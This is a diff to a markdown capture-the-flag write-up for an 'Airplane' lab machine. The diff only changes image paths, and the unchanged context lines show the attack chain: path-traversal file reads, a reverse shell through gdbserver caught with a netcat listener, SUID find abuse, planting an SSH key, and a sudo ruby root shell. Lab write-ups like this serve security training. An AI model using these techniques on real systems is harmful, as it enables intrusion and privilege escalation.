@@ -26,7 +26,7 @@ sudo nmap <TARGET-IP> -p- -sS -sV -vvv --min-rate 5000 -oN nmap_result
 
 ### Scan Results
 
-![Nmap scan results showing ports 22, 6048, and 8000](/images/airplane/nmap_result.png)
+![Nmap scan results showing ports 22, 6048, and 8000](/vapt-knowledge-base/images/airplane/nmap_result.png)
 
 ```text
 PORT     STATE SERVICE VERSION
@@ -56,7 +56,7 @@ Location: http://airplane.thm:8000/?page=index.html
 
 The `Location` header reveals the hostname: `airplane.thm`. We add this to our local `/etc/hosts` file:
 
-![Inspecting headers and hostname](/images/airplane/hostname.png)
+![Inspecting headers and hostname](/vapt-knowledge-base/images/airplane/hostname.png)
 
 ```bash
 echo "<TARGET-IP> airplane.thm" | sudo tee -a /etc/hosts
@@ -90,7 +90,7 @@ curl "http://airplane.thm:8000/?page=../../../../etc/passwd"  # Works!
 
 ### LFI Response
 
-![Local File Inclusion Path Traversal](/images/airplane/Path_Traversal.png)
+![Local File Inclusion Path Traversal](/vapt-knowledge-base/images/airplane/Path_Traversal.png)
 
 ```text
 root:x:0:0:root:/root:/bin/bash
@@ -121,7 +121,7 @@ curl http://airplane.thm:8000/?page=../../../../proc/net/tcp
 
 This exposes active TCP sockets in hex format, helping verify running local services.
 
-![TCP sockets listed in /proc/net/tcp](/images/airplane/active_tcp_connections.png)
+![TCP sockets listed in /proc/net/tcp](/vapt-knowledge-base/images/airplane/active_tcp_connections.png)
 
 ### Enumerating Running Processes
 To identify the service running on port `6048`, we enumerate processes by querying `/proc/[PID]/cmdline` iteratively. This reveals a remote debugging utility running on that port: **gdbserver**.
@@ -160,7 +160,7 @@ nc -lvnp 8999
 
 Upon executing `run` in GDB, we receive a callback:
 
-![Reverse shell callback as hudson](/images/airplane/rev_shell.png)
+![Reverse shell callback as hudson](/vapt-knowledge-base/images/airplane/rev_shell.png)
 
 ```text
 connect to [ATTACKER-IP] from [TARGET-IP]
@@ -202,7 +202,7 @@ ssh hudson@airplane.thm
 ### SUID Search
 We query the system for SUID binaries:
 
-![SUID binaries scan using find command](/images/airplane/find_command.png)
+![SUID binaries scan using find command](/vapt-knowledge-base/images/airplane/find_command.png)
 
 ```bash
 find / -type f -perm -u=s 2>/dev/null
@@ -226,7 +226,7 @@ ls -lh /usr/bin/find
 
 It is owned by user `carlos` and has the SUID bit set. According to **GTFOBins**, we can run commands as `carlos` by using the `-exec` flag:
 
-![Spawning a shell as carlos using find SUID](/images/airplane/find_priv_escalation.png)
+![Spawning a shell as carlos using find SUID](/vapt-knowledge-base/images/airplane/find_priv_escalation.png)
 
 ```bash
 find . -exec /bin/bash -p \; -quit
@@ -239,12 +239,12 @@ We verify our context:
 
 To transition fully, we add our SSH key to `/home/carlos/.ssh/authorized_keys`. 
 
-![carlos SSH authorized_keys file permission mistake](/images/airplane/carlos_ssh_authorized_keys_file_mistake.png)
+![carlos SSH authorized_keys file permission mistake](/vapt-knowledge-base/images/airplane/carlos_ssh_authorized_keys_file_mistake.png)
 
 > [!WARNING]
 > SSH enforces strict key file permissions. If authorized_keys permissions are too permissive, SSH authentication will ignore the key. Ensure permissions are set correctly:
 
-![SSH authorized_keys file permissions changed successfully](/images/airplane/authorized_keys_file_permission_changed.png)
+![SSH authorized_keys file permissions changed successfully](/vapt-knowledge-base/images/airplane/authorized_keys_file_permission_changed.png)
 
 ```bash
 chmod 700 ~/.ssh
@@ -286,7 +286,7 @@ echo 'exec "/bin/bash"' > /tmp/root_shell.rb
 
 We execute it using `sudo`:
 
-![Root shell execution via Ruby script](/images/airplane/ruby_shell_as_root.png)
+![Root shell execution via Ruby script](/vapt-knowledge-base/images/airplane/ruby_shell_as_root.png)
 
 ```bash
 sudo /usr/bin/ruby /root/../tmp/root_shell.rb
